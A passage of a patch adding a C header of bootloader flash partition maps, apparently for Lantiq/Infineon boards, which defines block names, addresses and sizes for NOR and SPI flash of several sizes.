+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block6=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=7\0"
+#endif
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+#ifdef CONFIG_OVERLAY
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB078FFFF
+#else
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB07DFFFF
+#endif
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+	
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME          "overlay"
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_START_ADDR          0xB0790000
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_SIZE                0x50000
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_END_ADDR            0xB07DFFFF
+	
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB07E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB07EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0xB07F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0xB07F0FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0xB07F1000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0xB07F1FFF
+  
+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	      	  "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	      	  0xB07F2000
+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0xB07F3FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                          0xB07FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0xB01FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0xB01FAE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0xB01FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0xB01FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0xB01FFDFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0xB01FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0xB01FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0xB01FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB03EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB03EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB03FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0xB03FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0xB03FEFFF
+
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME         "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0xB03FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0xB03FF3FF
+
+
+  #define IFX_CFG_FLASH_END_ADDR                         0xB03FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0010000\0"                                      \
+        "part2_begin=0xB0020000\0"                                      \
+        "part3_begin=0xB00A0000\0"                                      \
+        "total_part=4\0"
+#else
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+#endif
+
+#ifdef CONFIG_OVERLAY
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"        \
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block7=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block8=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block9=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=10\0"
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block8=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=9\0"
+#endif
+#else
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"        \
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block8=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=9\0"
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+#endif
+#endif
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME            "gphy_firmware"
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_START_ADDR            0xB0010000
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+#else
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+#endif
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+#if !defined( CONFIG_VR9_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#else
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+#endif
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+#ifdef CONFIG_OVERLAY
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB078FFFF
+#else
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB07DFFFF
+#endif
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_BLOCK_NAME          "overlay"
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_START_ADDR          0xB0790000
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_SIZE                0x50000
+  #define IFX_CFG_FLASH_OVERLAY_IMAGE_END_ADDR            0xB07DFFFF
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB07E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB07EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0xB07F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x2000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0xB07F1FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME               "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR               0xB07F2000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                     0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR                 0xB07F2FFF
+  
+  #define IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME	          "wlanconfig"
+  #define IFX_CFG_FLASH_WLAN_CFG_START_ADDR	  	  0xB07F3000
+  #define IFX_CFG_FLASH_WLAN_CFG_SIZE		          0x2000
+  #define IFX_CFG_FLASH_WLAN_CFG_END_ADDR		  0xB07F4FFF
+
+  #define IFX_CFG_FLASH_END_ADDR                          0xB07FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_NOR*/
+
+/***************************************************************************/
+/***************************************************************************/
+/***************SPI FLASH map starts here***********************************/
+/***************************************************************************/
+/***************************************************************************/
+
+#ifdef CONFIG_BOOT_FROM_SPI
+
+#ifdef CONFIG_SPI_FLASH_1M
+#define IFX_CONFIG_FLASH_SIZE 1
+#elif CONFIG_SPI_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_SPI_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_SPI_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#elif CONFIG_SPI_FLASH_16M
+#define IFX_CONFIG_FLASH_SIZE 16
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//1MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 1)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x000F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x000F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x000FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x000FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x000FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x000FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x000FFFFF
+//2MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "data_block6=" IFX_CFG_FLASH_WLAN_CFG_BLOCK_NAME "\0"    \
+        "total_db=7\0"
+        
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+ #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x003E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x003EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003F0FFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x003F1000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x1000
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x003F1FFF
+  
